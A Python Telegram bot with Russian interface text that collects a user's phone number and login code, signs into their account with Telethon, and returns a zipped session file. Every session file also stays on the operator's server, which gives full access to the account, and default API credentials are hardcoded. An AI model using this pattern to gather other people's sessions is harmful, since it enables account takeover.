import asyncio
import os
import zipfile
import telebot
from telebot import types
from telethon import TelegramClient

TOKEN = os.getenv('TOKEN')
API_ID = int(os.getenv('API_ID', '28537210'))
API_HASH = os.getenv('API_HASH', '5388b7e4bc869cce695b682f2644a160')

bot = telebot.TeleBot(TOKEN)
os.makedirs('sessions', exist_ok=True)

# Хранилище клиентов
user_clients = {}

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.chat.id
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📱 Отправить номер", request_contact=True)
    markup.add(btn)
    bot.send_message(uid, "🔑 Нажми кнопку ниже, чтобы отправить номер телефона", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(m):
    uid = m.chat.id
    if m.contact is None:
        bot.send_message(uid, "❌ Не удалось получить номер. Попробуй ещё раз /start")
        return
    
    phone = m.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone
    
    bot.send_message(uid, f"📲 Номер принят: {phone}\nОтправляю код...")
    
    async def send_code():
        client = TelegramClient(f'sessions/user_{uid}', API_ID, API_HASH)
        user_clients[uid] = client
        await client.connect()
        try:
            await client.send_code_request(phone)
            bot.send_message(uid, "✅ Код отправлен! Введите его цифрами:")
            bot.register_next_step_handler(m, get_code, client, phone)
        except Exception as e:
            bot.send_message(uid, f"❌ Ошибка: {e}")
            await client.disconnect()
            del user_clients[uid]
    
    asyncio.run(send_code())

def get_code(m, client, phone):
    uid = m.chat.id
    code = m.text.strip()
    
    async def login():
        try:
            await client.sign_in(phone, code)
            await client.disconnect()
            
            session_file = f'sessions/user_{uid}.session'
            if os.path.exists(session_file):
                zip_path = f'/tmp/session_{uid}.zip'
                with zipfile.ZipFile(zip_path, 'w') as zf:
                    zf.write(session_file, arcname=f'session_{uid}.session')
                with open(zip_path, 'rb') as f:
                    bot.send_document(uid, f, caption=f"✅ Сессия готова!\nНомер: {phone}")
                os.remove(zip_path)
            else:
                bot.send_message(uid, "❌ Ошибка: файл сессии не найден")
            
            if uid in user_clients:
                del user_clients[uid]
                
        except Exception as e:
            bot.send_message(uid, f"❌ Ошибка: {e}")
            await client.disconnect()
            if uid in user_clients:
                del user_clients[uid]
    
    asyncio.run(login())

# Убираем клавиатуру после завершения
@bot.message_handler(commands=['cancel'])
def cancel(m):
    uid = m.chat.id
    if uid in user_clients:
        async def close():
            await user_clients[uid].disconnect()
        asyncio.run(close())
        del user_clients[uid]
    
    markup = types.ReplyKeyboardRemove()
    bot.send_message(uid, "❌ Отменено", reply_markup=markup)

print("🚀 Session Bot запущен")
bot.polling()
